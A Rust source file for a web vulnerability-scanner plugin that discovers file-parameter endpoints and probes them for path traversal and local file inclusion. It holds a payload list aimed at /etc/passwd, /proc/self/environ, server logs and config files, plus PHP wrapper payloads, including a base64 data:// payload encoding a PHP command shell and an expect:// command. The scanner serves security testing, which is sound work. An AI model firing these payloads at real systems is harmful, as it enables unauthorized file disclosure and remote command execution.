//! Path Traversal / LFI Security Plugin
//!
//! Safely detects indicators of Path Traversal and Local File Inclusion (LFI)
//! vulnerabilities using controlled payloads and avoiding destructive actions.

use crate::security::{SecurityPlugin, SecurityPluginConfig, SecurityReference};
use crate::sdk::{CapabilityRequest, CapabilityResponse, AnalysisContext, Result, Capability, PluginId, Plugin};
use openre_core::result::{Finding, Severity, Confidence, Category, Evidence, EvidenceType, Reference, ReferenceType};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use async_trait::async_trait;
use tracing::{debug, info, warn};
use reqwest::Client;

/// Path Traversal / LFI Security Plugin
pub struct PathTraversalPlugin {
    config: PathTraversalConfig,
    client: Arc<reqwest::Client>,
}

impl PathTraversalPlugin {
    /// Create a new Path Traversal security plugin
    pub fn new(config: PathTraversalConfig) -> std::result::Result<Self, String> {
        let client = Arc::new(
            reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(config.request_timeout))
                .redirect(reqwest::redirect::Policy::limited(config.max_redirects as usize))
                .user_agent(&config.user_agent)
                .build()
                .map_err(|e| format!("Failed to create HTTP client: {}", e))?
        );
        
        Ok(Self { config, client })
    }
    
    /// Get plugin version
    fn version(&self) -> &'static str {
        "1.0.0"
    }
    
    /// Get plugin description
    fn description(&self) -> &'static str {
        "Safely detects indicators of Path Traversal and Local File Inclusion (LFI) vulnerabilities using controlled payloads and avoiding destructive actions"
    }
    
    /// Get plugin references
    fn references(&self) -> Vec<SecurityReference> {
        vec![
            SecurityReference {
                ref_type: "OWASP".to_string(),
                id: "A01:2021".to_string(),
                url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/".to_string(),
                description: "OWASP Top 10 2021 - Broken Access Control".to_string(),
            },
            SecurityReference {
                ref_type: "CWE".to_string(),
                id: "CWE-22".to_string(),
                url: "https://cwe.mitre.org/data/definitions/22.html".to_string(),
                description: "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')".to_string(),
            },
            SecurityReference {
                ref_type: "CWE".to_string(),
                id: "CWE-23".to_string(),
                url: "https://cwe.mitre.org/data/definitions/23.html".to_string(),
                description: "Relative Path Traversal".to_string(),
            },
            SecurityReference {
                ref_type: "CWE".to_string(),
                id: "CWE-98".to_string(),
                url: "https://cwe.mitre.org/data/definitions/98.html".to_string(),
                description: "Improper Control of Filename for Include/Require Statement in PHP Program ('PHP File Inclusion')".to_string(),
            },
        ]
    }
    
    /// Validate configuration
    fn validate_config(&self, config: &PathTraversalConfig) -> std::result::Result<(), String> {
        if config.request_timeout == 0 {
            return Err("request_timeout must be greater than 0".to_string());
        }
        if config.max_concurrent_requests == 0 {
            return Err("max_concurrent_requests must be greater than 0".to_string());
        }
        Ok(())
    }
    
    /// Discover potential path traversal/LFI endpoints
    async fn discover_endpoints(&self, base_url: &str) -> Vec<PathEndpoint> {
        let mut endpoints = Vec::new();
        
        // Common parameters that might be vulnerable to path traversal
        let common_params = vec![
            "file", "path", "filename", "document", "doc", "page",
            "template", "view", "include", "load", "read",
            "download", "attachment", "resource", "asset",
            "image", "img", "photo", "pic", "logo",
            "style", "css", "js", "script", "font",
            "lang", "locale", "theme", "skin",
            "config", "cfg", "settings", "conf",
            "backup", "bak", "old", "orig",
        ];
        
        // Common paths that might have file parameters
        let common_paths = vec![
            "/api", "/api/v1", "/api/v2",
            "/download", "/download/",
            "/file", "/file/",
            "/document", "/document/",
            "/view", "/view/",
            "/page", "/page/",
            "/template", "/template/",
            "/include", "/include/",
            "/resource", "/resource/",
            "/asset", "/asset/",
            "/static", "/static/",
            "/media", "/media/",
            "/files", "/files/",
            "/docs", "/docs/",
        ];
        
        for path in &common_paths {
            let url = format!("{}{}", base_url.trim_end_matches('/'), path);
            
            // Test each parameter with GET
            for param in &common_params {
                let test_url = format!("{}?{}={}", url, param, "test");
                
                if let Ok(resp) = self.client.get(&test_url).send().await {
                    if resp.status().is_success() || resp.status().as_u16() == 400 || resp.status().as_u16() == 404 {
                        endpoints.push(PathEndpoint {
                            url: test_url.clone(),
                            base_path: path.to_string(),
                            parameter: param.to_string(),
                            method: "GET".to_string(),
                            status: resp.status().as_u16(),
                        });
                    }
                }
            }
            
            // Also check POST endpoints with body parameters
            for param in &common_params {
                let body = format!("{}=test", param);
                if let Ok(resp) = self.client
                    .post(&url)
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .body(body)
                    .send()
                    .await 
                {
                    if resp.status().is_success() || resp.status().as_u16() == 400 || resp.status().as_u16() == 404 {
                        endpoints.push(PathEndpoint {
                            url: url.clone(),
                            base_path: path.to_string(),
                            parameter: param.to_string(),
                            method: "POST".to_string(),
                            status: resp.status().as_u16(),
                        });
                    }
                }
            }
        }
        
        endpoints
    }
    
    /// Test endpoint for path traversal/LFI vulnerabilities
    async fn test_endpoint(&self, endpoint: &PathEndpoint) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        // Path traversal payloads (safe, non-destructive)
        let traversal_payloads: Vec<(&str, &str)> = vec![
            // Basic traversal
            ("../../etc/passwd", "Basic Linux path traversal"),
            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Basic Windows path traversal"),
            ("../../etc/hosts", "Linux hosts file"),
            ("../../etc/hostname", "Linux hostname"),
            ("../../etc/issue", "Linux issue file"),
            ("../../proc/version", "Linux kernel version"),
            ("../../proc/self/environ", "Linux process environment"),
            ("../../proc/self/cmdline", "Linux process command line"),
            ("../../proc/self/status", "Linux process status"),
            ("../../proc/self/fd/0", "Linux file descriptor"),
            
            // Encoded traversal
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded traversal"),
            ("%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", "URL encoded Windows traversal"),
            ("..%2f..%2f..%2fetc%2fpasswd", "Partial URL encoded traversal"),
            ("..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", "Partial URL encoded Windows traversal"),
            
            // Double encoded
            ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Double URL encoded traversal"),
            
            // Unicode/UTF-8 bypasses
            ("\u{202E}etc/passwd", "Right-to-left override"),
            ("\u{FEFF}etc/passwd", "BOM"),
            
            // Null byte injection
            ("../../etc/passwd%00", "Null byte termination"),
            ("../../etc/passwd\x00", "Raw null byte"),
            
            // Path truncation
            {
                let long_path = format!("../../etc/passwd{}", "a".repeat(256));
                (Box::leak(long_path.into_boxed_str()), "Long path truncation")
            },
            
            // Relative path variations
            ("../etc/passwd", "Single level traversal"),
            ("..../etc/passwd", "Extra dots"),
            ("....//etc/passwd", "Double dots with slash"),
            ("..\\..\\etc\\passwd", "Mixed separators"),
            
            // Windows specific
            ("..\\..\\..\\windows\\win.ini", "Windows win.ini"),
            ("..\\..\\..\\windows\\system.ini", "Windows system.ini"),
            ("..\\..\\..\\boot.ini", "Windows boot.ini"),
            
            // LFI specific (PHP)
            ("php://filter/convert.base64-encode/resource=../../etc/passwd", "PHP filter wrapper"),
            ("php://input", "PHP input wrapper"),
            ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "PHP data wrapper"),
            ("expect://id", "PHP expect wrapper"),
            ("phar:///etc/passwd", "PHP phar wrapper"),
            ("zip:///etc/passwd", "PHP zip wrapper"),
            ("compress.zlib:///etc/passwd", "PHP zlib wrapper"),
            ("compress.bzip2:///etc/passwd", "PHP bzip2 wrapper"),
        ];
        
        for (payload, description) in traversal_payloads {
            if let Some(finding) = self.test_payload(endpoint, payload, description).await {
                findings.push(finding);
            }
        }
        
        // LFI-specific payloads for common include parameters
        let lfi_params = vec!["file", "page", "template", "view", "include", "load", "path", "doc", "document"];
        if lfi_params.contains(&endpoint.parameter.as_str()) {
            let lfi_payloads = vec![
                ("/etc/passwd", "Absolute path LFI"),
                ("C:\\Windows\\System32\\drivers\\etc\\hosts", "Absolute Windows path LFI"),
                ("/proc/self/environ", "Process environment LFI"),
                ("/var/log/apache2/access.log", "Apache access log LFI"),
                ("/var/log/nginx/access.log", "Nginx access log LFI"),
                ("/var/log/httpd/access_log", "Apache access log LFI"),
                ("/var/log/auth.log", "Auth log LFI"),
                ("/var/log/secure", "Secure log LFI"),
                ("/etc/apache2/apache2.conf", "Apache config LFI"),
                ("/etc/nginx/nginx.conf", "Nginx config LFI"),
                ("/etc/httpd/conf/httpd.conf", "Apache config LFI"),
                ("/etc/php/7.4/fpm/php.ini", "PHP config LFI"),
                ("/etc/php.ini", "PHP config LFI"),
                (".htaccess", "Htaccess LFI"),
                ("web.config", "Web.config LFI"),
            ];
            
            for (payload, description) in lfi_payloads {
                if let Some(finding) = self.test_payload(endpoint, payload, description).await {
                    findings.push(finding);
                }
            }
        }
        
        findings
    }
    
    /// Test a single payload
    async fn test_payload(&self, endpoint: &PathEndpoint, payload: &str, description: &str) -> Option<Finding> {
        let test_url = if endpoint.method == "GET" {
            format!("{}?{}={}", endpoint.url.split('?').next().unwrap_or(&endpoint.url), endpoint.parameter, urlencoding::encode(payload))
        } else {
            endpoint.url.clone()
        };
        
        let body = if endpoint.method == "POST" {
            Some(format!("{}={}", endpoint.parameter, urlencoding::encode(payload)))
        } else {
            None
        };
        
        let req = if endpoint.method == "GET" {
            self.client.get(&test_url)
        } else {
            let mut req = self.client.post(&endpoint.url)
                .header("Content-Type", "application/x-www-form-urlencoded");
            if let Some(b) = body {
                req = req.body(b);
            }
            req
        };
        
        if let Ok(resp) = req.send().await {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            
            // Check for successful traversal indicators
            let success_indicators = [
                ("root:x:0:0:", "/etc/passwd content"),
                ("daemon:x:1:1:", "/etc/passwd content"),
                ("[fonts]", "Windows win.ini content"),
                ("for 16-bit app support", "Windows win.ini content"),
                ("[extensions]", "Windows system.ini content"),
                ("[boot loader]", "Windows boot.ini content"),
                ("HTTP_USER_AGENT=", "Process environment"),
                ("SERVER_SOFTWARE=", "Process environment"),
                ("PATH=", "Process environment"),
                ("Linux version", "Kernel version"),
                ("root:", "Passwd file"),
                ("bin:", "Passwd file"),
                ("daemon:", "Passwd file"),
                ("sys:", "Passwd file"),
                ("sync:", "Passwd file"),
                ("games:", "Passwd file"),
                ("man:", "Passwd file"),
                ("lp:", "Passwd file"),
                ("mail:", "Passwd file"),
                ("news:", "Passwd file"),
                ("uucp:", "Passwd file"),
                ("proxy:", "Passwd file"),
                ("www-data:", "Passwd file"),
                ("backup:", "Passwd file"),
                ("list:", "Passwd file"),
                ("irc:", "Passwd file"),
                ("gnats:", "Passwd file"),
                ("nobody:", "Passwd file"),
                ("systemd:", "Passwd file"),
                ("messagebus:", "Passwd file"),
                ("_apt:", "Passwd file"),
            ];
            
            for (indicator, desc) in &success_indicators {
                if body.contains(indicator) {
                    return Some(self.create_finding(
                        "Path Traversal / LFI Vulnerability",
                        &format!("Endpoint {} vulnerable to {}: {} - {} exposed", endpoint.base_path, description, payload, desc),
                        Severity::Critical,
                        Confidence::High,
                        Category::SecurityMisconfiguration,
                        endpoint,
                        payload,
                        vec!["path-traversal".to_string(), "lfi".to_string(), "file-inclusion".to_string()],
                        vec![
                            "Implement proper input validation and sanitization".to_string(),
                            "Use allowlist for permitted file paths".to_string(),
                            "Implement path canonicalization and validation".to_string(),
                            "Restrict file access to designated directories".to_string(),
                        ],
                    ));
                }
            }
            
            // Check for PHP error messages indicating LFI
            let php_errors = [
                "failed to open stream",
                "No such file or directory",
                "Permission denied",
                "include(): Failed opening",
                "require(): Failed opening",
                "include_once(): Failed opening",
                "require_once(): Failed opening",
                "Warning: include(",
                "Warning: require(",
            ];
            
            for error in &php_errors {
                if body.contains(error) {
                    return Some(self.create_finding(
                        "Potential Local File Inclusion (LFI)",
                        &format!("Endpoint {} shows PHP error indicative of LFI: {} - Error: {}", endpoint.base_path, description, error),
                        Severity::High,
                        Confidence::Medium,
                        Category::SecurityMisconfiguration,
                        endpoint,
                        payload,
                        vec!["lfi".to_string(), "php".to_string(), "file-inclusion".to_string()],
                        vec![
                            "Disable allow_url_include in PHP configuration".to_string(),
                            "Implement strict input validation for file parameters".to_string(),
                            "Use allowlist for permitted include paths".to_string(),
                        ],
                    ));
                }
            }
        }
        
        None
    }
    
    /// Create a finding
    fn create_finding(
        &self,
        title: &str,
        description: &str,
        severity: Severity,
        confidence: Confidence,
        category: Category,
        endpoint: &PathEndpoint,
        payload: &str,
        tags: Vec<String>,
        verification_steps: Vec<String>,
    ) -> Finding {
        let mut finding = Finding::new(
            title.to_string(),
            description.to_string(),
            severity,
            confidence,
            category,
            endpoint.url.clone(),
            "web_application".to_string(),
            "path_traversal".to_string(),
            self.version().to_string(),
            openre_core::ids::ScanId::new(),
        );
        
        finding = finding.with_evidence(Evidence {
            evidence_type: EvidenceType::HttpResponse,
            description: format!("Path traversal test for {} with payload: {}", endpoint.parameter, payload),
            data: Some(serde_json::json!({
                "endpoint": {
                    "url": endpoint.url,
                    "base_path": endpoint.base_path,
                    "parameter": endpoint.parameter,
                    "method": endpoint.method,
                    "status": endpoint.status,
                },
                "payload": payload,
                "description": description,
            })),
            location: Some(endpoint.url.clone()),
            metadata: HashMap::new(),
        });
        
        for reference in self.references() {
            finding = finding.with_reference(Reference {
                reference_type: match reference.ref_type.as_str() {
                    "CWE" => ReferenceType::Cwe,
                    "OWASP" => ReferenceType::Owasp,
                    "CVE" => ReferenceType::Cve,
                    _ => ReferenceType::Custom(reference.ref_type),
                },
                title: reference.id.clone(),
                url: reference.url.clone(),
                description: Some(reference.description.clone()),
            });
        }
        
        for tag in tags {
            finding = finding.with_tag(tag);
        }
        finding = finding.with_tag("path-traversal".to_string());
        finding = finding.with_tag("lfi".to_string());
        
        finding
    }
}

#[async_trait]
impl Plugin for PathTraversalPlugin {
    type Config = PathTraversalConfig;
    
    fn new(config: Self::Config) -> Self {
        Self::new(config).expect("Failed to create Path Traversal plugin")
    }
    
    fn capabilities(&self) -> Vec<Capability> {
        vec![
            Capability::NetworkAccess,
            Capability::ReadConfig,
        ]
    }
    
    async fn execute(&self, request: CapabilityRequest) -> Result<CapabilityResponse> {
        let context = request.context;
        let target_url = request.input.get("target_url")
            .and_then(|v| v.as_str())
            .unwrap_or("http://localhost");
        
        info!("Starting path traversal/LFI analysis for {}", target_url);
        
        // Discover endpoints
        let endpoints = self.discover_endpoints(target_url).await;
        let endpoints_count = endpoints.len();
        info!("Discovered {} potential path traversal endpoints", endpoints_count);
        
        // Test each endpoint
        let mut all_findings = Vec::new();
        for endpoint in endpoints {
            let findings = self.test_endpoint(&endpoint).await;
            all_findings.extend(findings);
        }
        
        info!("Found {} path traversal/LFI issues", all_findings.len());
        
        Ok(CapabilityResponse::success(serde_json::json!({
            "findings": all_findings,
            "endpoints_tested": endpoints_count,
            "vulnerabilities_found": all_findings.len(),
        })))
    }
}

/// Path Traversal Plugin Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct PathTraversalConfig {
    pub request_timeout: u64,
    pub max_concurrent_requests: usize,
    pub user_agent: String,
    pub follow_redirects: bool,
    pub max_redirects: usize,
    pub verify_ssl: bool,
}

impl Default for PathTraversalConfig {
    fn default() -> Self {
        Self {
            request_timeout: 30,
            max_concurrent_requests: 10,
            user_agent: "open-re-path-traversal/1.0".to_string(),
            follow_redirects: true,
            max_redirects: 10,
            verify_ssl: true,
        }
    }
}

/// Path Endpoint representation
#[derive(Debug, Clone, Serialize, Deserialize)]
struct PathEndpoint {
    url: String,
    base_path: String,
    parameter: String,
    method: String,
    status: u16,
}

// Plugin entry point
